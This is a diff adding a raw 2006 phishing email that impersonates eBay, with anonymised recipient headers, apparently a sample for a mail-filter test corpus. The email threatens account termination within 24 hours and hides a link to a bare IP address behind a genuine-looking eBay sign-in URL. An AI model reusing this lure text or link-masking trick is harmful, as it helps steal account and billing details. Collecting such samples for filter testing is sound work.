@@ -1,0 +1,189 @@
+From nobody Sun Jan 25 13:49:59 2015
+Return-Path: <aw-confirm@ebay.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id EC50046AC2
+ for <user@login.example.com>; Fri, 15 Sep 2006 22:00:03 -0400 (EDT)
+Received: from client-201.240.221.59.speedy.net.pe (unknown [201.240.221.59])
+ by mail.example.org (Postfix) with ESMTP id 111AC6CD0E9
+ for <user@example.com>; Fri, 15 Sep 2006 22:00:01 -0400 (EDT)
+Received: from wtf (wtf [10.0.0.139]) 
+ by wtf (8.12.8p1/8.12.8) with ESMTP id i11K0Dlb041698
+ for <user@example.com>; Fri, 15 Sep 2006 20:59:56 -0500
+ (envelope-from "eBay Confirmations" <aw-confirm@ebay.com>)
+Message-ID: <000c01c6d909$e6314700$8b00000a@wtf>
+From: "eBay Confirmations" <aw-confirm@ebay.com>
+To: user@example.com
+Subject: Your eBay account could be suspended !
+Date: Fri, 15 Sep 2006 20:59:56 -0500
+MIME-Version: 1.0
+Content-Type: text/html; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 253
+
+<head>
+<script type='text/javascript'>
+<!--
+
+  if(document.location.search != "")  {
+    obj = document.location.search.substr(document.location.search.indexOf('?') + 1)
+    address = (obj=="true") ? true : false ;
+  } else {
+    address=true
+  }
+
+
+
+  function toggleAddress(isvis)  {
+
+    add = (address) ? "no" : "yes" ;
+
+    if(isvis != "")  {
+      add = isvis
+    }
+    q = (add=="yes") ? false : true ;
+    if(q) {
+      address=false
+    } else {
+      address=true
+    }
+
+    window.open("luna.html","","toolbar=yes,status=yes,menubar=yes,resizable=yes,location=no");
+
+    self.opener = ""
+    self.close()
+  }
+
+//-->
+</script>
+</head>
+
+<xbody>
+
+<table cellSpacing="0" cellPadding="0" width="600" dir="ltr">
+  <tr>
+    <td width="600" dir="ltr">
+    <table cellSpacing="0" cellPadding="2" width="100%" bgColor="#eeeef8" border="0" dir="ltr">
+      <tr>
+        <td dir="ltr">
+        <p dir="ltr">
+        <a title="http://www.ebay.com/" href="http://www.ebay.com/"  >
+        <img title="http://pics.ebaystatic.com/aw/pics/email/eBayLogo.gif" src="http://pics.ebaystatic.com/aw/pics/email/eBayLogo.gif"  align="right" border="0" width="37" height="18"></a><font face="Verdana" size="4"> 
+        Identity Verification Center </font></td>
+      </tr>
+      <tr bgColor="#9999cc" height="2" dir="ltr">
+        <td dir="ltr">
+        <p dir="ltr"> </td>
+      </tr>
+    </table>
+    <p dir="ltr">
+      <cursive language="___JavaScript1.1" type="text/___javascript">
+      <a target="_blank"  href="http://pages.ebay.com/"  >
+      <img alt="From collectibles to cars, buy and sell all kinds of items on eBay" src="http://pics.ebaystatic.com/aw/pics/navbar/redesign_p1/ebayLogo.gif"  border="0" width="150" height="70"></a></cursive><br>
+     </p>
+      <p dir="ltr" align="left"><font face="Verdana" size=2><font color="#808080">
+      <b>Dear valued eBay member</b></font>, <br>
+      <font color="#333399">It has come to our attention, that your eBay Billing 
+      Information records are out of date. This requires you to verify your Account and Billing 
+      Information. If you could please take 5-10 minutes out of your online experience 
+      and update your billing records, you will not run into any future problems 
+      with eBay's online service. However, failure to update your records will 
+      result in account termination, cancelation of service, Terms of Service 
+      (TOS) violations or future billing problems. Therefore we encourage you to 
+      update your records within 24 hours. </font><font color="#00007f">
+      <br>
+      </font><b><font color="#ffcc00" size="4">P</font><font color="#808080">lease 
+      click here to update your account records.</font></b><br>
+
+
+<div><a href="https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&sid=verify&co_partnerId=2&siteid=0"><table><caption><a href="http://61.100.180.12/img/.../"><u style="cursor: pointer"><font color="#008000">eBay Update Center</font></u></a></caption></table></a></div>
+
+
+
+
+
+</font></p>
+      <p dir="ltr" align="left"><font face="verdana" size=2>
+      <br>
+      <font color="#00007f">Thank you for your time! <br>
+      </font><font color="#FF3300">Stephen Dennis, </font><font color="#00007f">
+      <br>
+      eBay Billing Department team.</font></p>
+      <p dir="ltr" align="left"><font color="#00007f">As outlined in our User 
+      Agreement, eBay will periodically send you information about site changes 
+      and enhancements. Visit our Privacy Policy and </font>
+      <a target="_blank"  href="http://pages.ebay.com/help/community/png-user.html?ssPageName=ADME:X:EOA:US:24"  >
+      <font color="#00007f">User Agreement</font></a><font color="#00007f"> if 
+      you have any questions. </font></p>
+      </font>
+    <table cellSpacing="0" cellPadding="2" width="100%" border="0" dir="ltr">
+      <tr>
+        <td dir="ltr">
+        <table cellSpacing="5" cellPadding="2" width="100%" bgColor="#eeeef8" border="0" dir="ltr">
+        </table>
+        </td>
+        <td vAlign="top" width="120" dir="ltr">
+         </td>
+      </tr>
+    </table>
+    <table cellSpacing="0" cellPadding="0" width="100%" bgColor="#cccccc" dir="ltr">
+      <tr>
+        <td height="1" dir="ltr">
+        <p dir="ltr"> </td>
+      </tr>
+    </table>
+    <table cellSpacing="0" cellPadding="0" width="100%" border="0" dir="ltr">
+      <tr vAlign="top" dir="ltr">
+        <td dir="ltr">
+        <p dir="ltr"><font face="Verdana" size="1">
+        <a target="_blank"  title="http://pages.ebay.com/search/items/basicsearch.html?ssPageName=ADME:B:BN:US:8" href="http://pages.ebay.com/search/items/basicsearch.html?ssPageName=ADME:B:BN:US:8"  >
+        Search eBay</a> - Find other items of interest</font><br>
+        <font face="Verdana" size="1">
+        <a target="_blank"  title="http://my.ebay.com/ws/eBayISAPI.dll?MyeBay&ssPageName=ADME:B:BN:US:9" href="http://my.ebay.com/ws/eBayISAPI.dll?MyeBay&ssPageName=ADME:B:BN:US:9"  >
+        My eBay</a> - Track your buying and selling activity</font><br>
+        <font face="Verdana" size="1">
+        <a target="_blank"  title="http://pages.ebay.com/community/chat/index.html?ssPageName=ADME:X:BN:US:10" href="http://pages.ebay.com/community/chat/index.html?ssPageName=ADME:X:BN:US:10"  >
+        Discussion boards</a> - Get help from other eBay members</font><br>
+        <font face="Verdana" size="1">
+        <a target="_blank"  title="http://pages.ebay.com/help/index_popup.html?ssPageName=ADME:X:BN:US:11" href="http://pages.ebay.com/help/index_popup.html?ssPageName=ADME:X:BN:US:11"  >
+        eBay Help</a> - Find answers to your questions</font><br>
+         </td>
+        
+    <table cellSpacing="0" cellPadding="0" width="100%" bgColor="#cccccc" dir="ltr">
+      <tr>
+        <td height="1" dir="ltr">
+        <p dir="ltr"> </td>
+      </tr>
+    </table>
+    <table cellSpacing="0" cellPadding="0" width="100%" border="0" dir="ltr">
+      <tr>
+        <td dir="ltr">
+        <font face="Verdana" color="#666666" size="1">
+        <p dir="ltr">
+       </p>
+        <p dir="ltr">As outlined in our User Agreement, eBay will periodically 
+        send you information about site changes and enhancements. Visit our
+        <a target="_blank"  title="http://pages.ebay.com/help/policies/privacy-policy.html?ssPageName=ADME:X:BN:US:14" href="http://pages.ebay.com/help/policies/privacy-policy.html?ssPageName=ADME:X:BN:US:14"  >
+        Privacy Policy</a> and
+        <a target="_blank"  title="http://pages.ebay.com/help/policies/user-agreement.html?ssPageName=ADME:X:BN:US:13" href="http://pages.ebay.com/help/policies/user-agreement.html?ssPageName=ADME:X:BN:US:13"  >
+        User Agreement</a> if you have any questions.</p>
+        <p align="center" dir="ltr">Copyright © 2006 eBay Inc. All Rights 
+        Reserved.<br>
+        Designated trademarks and brands are the property of their respective 
+        owners. </p>
+        <p align="center" dir="ltr">eBay and the eBay logo are trademarks of 
+        eBay Inc. </font></td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+</table>
+
+</xbody>
+
+</html>
+</table>
